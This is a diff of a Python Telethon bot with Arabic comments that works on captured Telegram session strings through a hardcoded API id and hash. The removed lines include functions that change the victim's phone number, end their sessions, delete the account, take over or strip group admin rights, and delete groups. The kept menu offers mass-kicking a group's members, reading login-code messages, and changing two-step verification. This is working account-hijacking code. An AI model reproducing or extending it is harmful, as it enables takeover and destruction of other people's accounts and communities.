@@ -39,102 +39,10 @@ async def change_2fa(strses, current_password, new_password, hint=""):
         except Exception as e:
             return str(e)
 
-# تعريف وظيفة تغيير رقم الهاتف
-async def change_number(strses, number):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        bot = client = X
-        result = await bot(functions.account.SendChangePhoneCodeRequest(
-            phone_number=number,
-            settings=types.CodeSettings(
-                allow_flashcall=True,
-                current_number=True,
-                allow_app_hash=True
-            )
-        ))
-        return str(result)
-
-# تعريف وظيفة جلب معلومات المستخدم
-async def userinfo(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        k = await X.get_me()
-        return str(k)
-
-# تعريف وظيفة إنهاء الجلسات
-async def terminate(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            await X(rt())
-            return True
-        except Exception as rr:
-            return rr
-
-# تعريف وظيفة حذف الحساب
-async def delacc(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        await X(functions.account.DeleteAccountRequest("I am chutia"))
-
-# تعريف وظيفة الترقية إلى مشرف
-async def promote(strses, grp, user):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-        except:
-            await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
-
-# تعريف وظيفة التحقق من وجود تحقق بخطوتين
-async def user2fa(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            result = await X(functions.account.GetPasswordRequest())
-            if result.has_password:
-                h = result.hint
-                if h == None:
-                    h = "لا يوجد"
-                return False, h
-            else:
-                return True, "n"
-        except:
-            return False, "لا يوجد"
-
-# تعريف وظيفة حذف جميع المشرفين
-async def demall(strses, grp):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
-            try:
-                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
-            except:
-                await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-
-# تعريف وظيفة الانضمام إلى مجموعة
-async def joingroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        await X(join(username))
-
-# تعريف وظيفة مغادرة مجموعة
-async def leavegroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        await X(leave(username))
-
-# تعريف وظيفة حذف مجموعة
-async def delgroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        await X(dc(username))
-
-# تعريف وظيفة جلب القنوات التي يديرها المستخدم
-async def userchannels(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        k = await X(pc())
-        i = ""
-        for x in k.chats:
-            try:
-                i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
-            except:
-                pass
-        return str(i)
-
 # تعريف القائمة الرئيسية للأوامر
 menu = '''
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
+
 "B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص...]
 "C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
 "D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
@@ -151,7 +59,7 @@ menu = '''
 "O" :~ [تغيير التحقق بخطوتين باستخدام كود ترمكس]
 '''
 
-# تعريف لوحة الأزرار (keyboard)
+# تعريف لوحة الأزرار (keyboard) مع إصلاح ظهور الزر "O"
 keyboard = [
     [Button.inline("A", data="A"), Button.inline("B", data="B"), Button.inline("C", data="C"), Button.inline("D", data="D"), Button.inline("E", data="E")],
     [Button.inline("F", data="F"), Button.inline("G", data="G"), Button.inline("H", data="H"), Button.inline("I", data="I"), Button.inline("J", data="J")],
@@ -181,7 +89,6 @@ async def change_2fa_handler(event):
             await event.respond(f"حدث خطأ: {result}", buttons=keyboard)
 
 # باقي الكود...
-
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
     @tgbot.on(events.InlineQuery)
     async def inline_handler(event):
